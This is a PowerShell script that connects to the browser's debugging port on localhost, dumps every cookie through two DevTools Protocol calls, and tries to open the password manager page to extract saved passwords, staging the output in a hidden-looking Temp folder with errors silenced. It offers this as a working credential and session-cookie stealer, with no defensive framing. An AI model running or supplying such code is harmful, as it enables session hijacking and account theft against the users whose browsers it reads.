$ErrorActionPreference = 'SilentlyContinue'

# Connect to Edge CDP WebSocket and dump all cookies
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]"ws://127.0.0.1:9222/devtools/browser", $ct).Wait()

# Send Storage.getCookies command
$msg = '{"id":1,"method":"Storage.getCookies"}'
$b = [System.Text.Encoding]::UTF8.GetBytes($msg)
$s = [ArraySegment[byte]]::new($b)
$ws.SendAsync($s, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()

# Receive response
$buf = [byte[]]::new(10485760)
$s2 = [ArraySegment[byte]]::new($buf)
$r = $ws.ReceiveAsync($s2, $ct).Result
$response = [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)

# Save cookies
$response | Out-File C:\Windows\Temp\ziti\ck.json -Encoding utf8
Write-Output "cookies saved: $($r.Count) bytes"

# Also send Browser.getAllCookies for more comprehensive data
$msg2 = '{"id":2,"method":"Browser.getAllCookies"}'
$b2 = [System.Text.Encoding]::UTF8.GetBytes($msg2)
$s3 = [ArraySegment[byte]]::new($b2)
$ws.SendAsync($s3, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
$r2 = $ws.ReceiveAsync($s2, $ct).Result
$response2 = [System.Text.Encoding]::UTF8.GetString($buf, 0, $r2.Count)
$response2 | Out-File C:\Windows\Temp\ziti\ck_all.json -Encoding utf8
Write-Output "all cookies saved: $($r2.Count) bytes"

$ws.Dispose()

# Also try to get saved passwords via CDP
# Create a new page target
$tabs = Invoke-WebRequest -Uri "http://127.0.0.1:9222/json/new?url=chrome://password-manager" -UseBasicParsing -TimeoutSec 10
$tab = ($tabs.Content | ConvertFrom-Json)
$tabId = $tab.id
$tabWs = $tab.webSocketDebuggerUrl

# Connect to the page's WebSocket
$ws2 = New-Object System.Net.WebSockets.ClientWebSocket
$ws2.ConnectAsync([Uri]$tabWs, $ct).Wait()

# Evaluate JavaScript to dump password data
$js = '{"id":3,"method":"Runtime.evaluate","params":{"expression":"JSON.stringify({cookies: document.cookie, urls: window.location.href})"}}'
$b3 = [System.Text.Encoding]::UTF8.GetBytes($js)
$s4 = [ArraySegment[byte]]::new($b3)
$ws2.SendAsync($s4, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
$r3 = $ws2.ReceiveAsync($s2, $ct).Result
$response3 = [System.Text.Encoding]::UTF8.GetString($buf, 0, $r3.Count)
$response3 | Out-File C:\Windows\Temp\ziti\pw_dump.json -Encoding utf8
Write-Output "password dump: $($r3.Count) bytes"

$ws2.Dispose()
Write-Output "ALL DONE"